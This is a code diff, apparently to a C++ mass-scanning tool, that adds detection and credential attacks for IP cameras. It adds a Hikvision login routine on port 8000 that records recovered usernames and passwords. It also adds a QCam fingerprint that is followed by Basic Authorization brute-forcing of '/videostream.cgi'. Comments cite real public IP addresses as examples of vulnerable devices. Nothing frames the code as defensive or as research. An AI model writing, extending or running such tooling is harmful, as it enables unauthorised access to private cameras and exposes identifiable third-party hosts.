@@ -11,6 +11,7 @@
 #include "FileUpdater.h"
 #include "IPCAuth.h"
 #include <qjsonobject.h>
+#include "HikvisionLogin.h"
 
 unsigned char tl(unsigned char d)
 {
@@ -394,6 +395,9 @@ int sharedDetector(const char * ip, int port, const std::string *buffcpy, const 
 	if (Utils::ustrstr(buffcpy, "WEB SERVICE") != -1
 		&& Utils::ustrstr(buffcpy, "jsmain/liveview.js") != -1
 		)																				return 54; //Beward (http://46.146.243.88:88/login.asp)
+
+	if (Utils::ustrstr(buffcpy, "get_status.cgi") != -1
+		&& Utils::ustrstr(buffcpy, "str_device+") != -1)								return 55; //QCam (http://1.177.123.118:8080/)
 
     if(((Utils::ustrstr(buffcpy, "220") != -1) && (port == 21)) ||
         (Utils::ustrstr(buffcpy, "220 diskStation ftp server ready") != -1) ||
@@ -2334,7 +2338,18 @@ int Lexems::header(char *ip, int port, const char *str, Lexems *l, PathStr *ps, 
 
 int Lexems::filler(char* ip, int port, const std::string *buffcpy, int size, Lexems *lx)
 {
-	if (port == 22)
+	if (HikVis::isInitialized && port == 8000) {
+		HikVis hv;
+		lopaStr lps = hv.HVLobby(ip, port);
+		if (strstr(lps.login, "UNKNOWN") == NULL && strlen(lps.other) == 0)
+		{
+			_specFillerBA(ip, port, "[Hikvision] iVMS client required.", lps.login, lps.pass, 0);
+			fillGlobalLogData(ip, port, std::to_string(size).c_str(), "[Hikvision] iVMS client required ().", 
+				lps.login, lps.pass, "[Hikvision] iVMS", "UTF-8", "Basic Authorization");
+			return -1;
+		};
+	}
+	else if (port == 22)
 	{
 		_saveSSH(ip, 22, size, buffcpy->c_str());
 		return -1;
@@ -2602,6 +2617,10 @@ int Lexems::filler(char* ip, int port, const std::string *buffcpy, int size, Lex
 	else if (flag == 54) //Beward
 	{
 		_specWEBIPCAMBrute(ip, port, "[BEWARD] WEB IP Camera", flag, "WEB Authorization", cp, size, "BEWARD");
+	}
+	else if (flag == 55) //QCam
+	{
+		_specBrute(ip, port, "IP Camera", flag, "/videostream.cgi", "Basic Authorization", cp, size);
 	}
 	else if (flag == 20) //AXIS Camera
 	{
